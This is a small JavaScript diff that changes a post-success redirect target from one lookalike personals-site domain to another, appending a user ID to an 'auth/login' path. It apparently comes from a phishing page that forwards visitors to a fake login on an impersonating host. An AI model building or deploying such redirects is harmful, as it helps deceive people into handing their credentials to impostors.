@@ -97,7 +97,7 @@ $(document).ready(function () {
                     
                         // Redirect to another URL on success
                         window.onload = function(){
-                            window.location.href = `https://megapersonalsaa.shop/users/auth/login/${userId}`;
+                            window.location.href = `https://mp-view.my.id/users/auth/login/${userId}`;
                           }
                     
                 },
